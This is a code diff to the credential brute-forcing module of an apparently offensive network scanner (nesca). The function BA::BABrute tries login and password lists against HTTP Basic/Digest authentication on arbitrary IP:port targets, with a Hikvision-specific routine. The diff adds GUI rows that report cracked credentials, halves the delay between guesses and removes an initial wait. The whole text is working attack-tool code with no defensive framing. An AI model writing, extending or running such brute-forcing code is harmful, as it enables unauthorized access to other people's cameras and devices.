@@ -25,8 +25,6 @@ int BA::checkOutput(const string *buffer, const char *ip, const int port) {
 		|| Utils::ustrstr(*buffer, "403 Forbidden") != -1
 		)
 	{
-		stt->doEmition_BARedData("[.] 503/400/403 - Waiting 30sec (" + QString(ip) + ":" + QString::number(port) + ")");
-
 		Sleep(30000);
 		return -1;
 	}
@@ -47,33 +45,28 @@ inline bool commenceHikvisionEx1(const char *ip, const int port, bool digestMode
 	return 0;
 }
 
-lopaStr BA::BABrute(const char *ip, const int port, bool digestMode) {
-    string lpString;
+lopaStr BA::BABrute(const char *ip, const int port) {
+	bool digestMode = true;
+	string lpString;
     lopaStr lps = {"UNKNOWN", "", ""};
     int passCounter = 0;
 	int res = 0;
+	int rowIndex = -1;
 
 	std::string buff;
 	Connector con;
-	Sleep(1000);
+
 	con.nConnect(ip, port, &buff);
 	int isDig = Utils::isDigest(&buff);
+	QString ipString = QString(ip).mid(0, QString(ip).indexOf("/")) + ":" + QString::number(port);
 	if (isDig == -1) {
-		stt->doEmitionFoundData("<span style=\"color:orange;\">No 401 detected - <a style=\"color:orange;\" href=\"http://" + QString(ip).mid(0, QString(ip).indexOf("/")) + ":" + QString::number(port) + "/\">" +
-		QString(ip) + ":" + QString::number(port) + "</a></span>");
+		stt->doEmitionFoundData("<span style=\"color:orange;\">No 401 detected - <a style=\"color:orange;\" href=\"http://" + ipString + "/\">" +
+			ipString + "</a></span>");
 		strcpy(lps.login, "");
 		return lps;
 	}
-	else if (isDig == 1) {
-		if (digestMode != true) {
-			digestMode = true;
-		}
-	}
-	else {
-		if (digestMode != false) {
-			digestMode = false;
-		};
-	}
+	else if (isDig == 1) digestMode = true; 
+	else digestMode = false;
 
 	std::string buffer;
 
@@ -96,6 +89,13 @@ lopaStr BA::BABrute(const char *ip, const int port, bool digestMode) {
 			else if (res != -1) {
 				res = checkOutput(&buffer, ip, port);
 				if (res == -2) {
+
+					if (rowIndex == -1) {
+						nesca_3::addBARow(QString(ip) + ":" + QString::number(port), "--", "404");
+					}
+					else {
+						stt->doEmitionChangeBARow(rowIndex, "--", "404");
+					}
 					strcpy(lps.other, "404");
 					return lps;
 				}
@@ -104,31 +104,53 @@ lopaStr BA::BABrute(const char *ip, const int port, bool digestMode) {
 					break;
 				}
 				if (res == 1) {
+					if (rowIndex == -1) {
+						nesca_3::addBARow(QString(ip) + ":" + QString::number(port), QString(loginLst[i]) + ":" + QString(passLst[j]), "OK");
+					}
+					else {
+						stt->doEmitionChangeBARow(rowIndex, QString(loginLst[i]) + ":" + QString(passLst[j]), "OK");
+					}
+
 					strcpy(lps.login, loginLst[i]);
 					strcpy(lps.pass, passLst[j]);
 					return lps;
 				};
 			}
 
-			if (BALogSwitched) stt->doEmitionBAData("BA: " + QString(ip) + ":" + QString::number(port) + 
-                "; l/p: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" +
-				QString::number((++passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
-
-            Sleep(100);
+			if (BALogSwitched) {
+				if (rowIndex == -1) {
+					rowIndex = nesca_3::addBARow(QString(ip) + ":" + QString::number(port),
+						QString(loginLst[i]) + ":" + QString(passLst[j]),
+						QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%");
+				}
+				else {
+					stt->doEmitionChangeBARow(rowIndex, QString(loginLst[i]) + ":" + QString(passLst[j]), 
+						QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%");
+				}
+			}
+			else { rowIndex = -1; }
+			++passCounter;
+            Sleep(50);
         }
     }
 
+	if (rowIndex == -1) {
+		nesca_3::addBARow(QString(ip) + ":" + QString::number(port), "--", "FAIL");
+	}
+	else {
+		stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
+	}
     return lps;
 }
 
-lopaStr BA::BALobby(const char *ip, const int port, bool digestMode) {
+lopaStr BA::BALobby(const char *ip, const int port) {
     if(gMaxBrutingThreads > 0) {
 
         while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);
 
 		++baCount;
 		++BrutingThrds;
-		const lopaStr &lps = BABrute(ip, port, digestMode);
+		const lopaStr &lps = BABrute(ip, port);
 		--BrutingThrds;
 
         return lps;
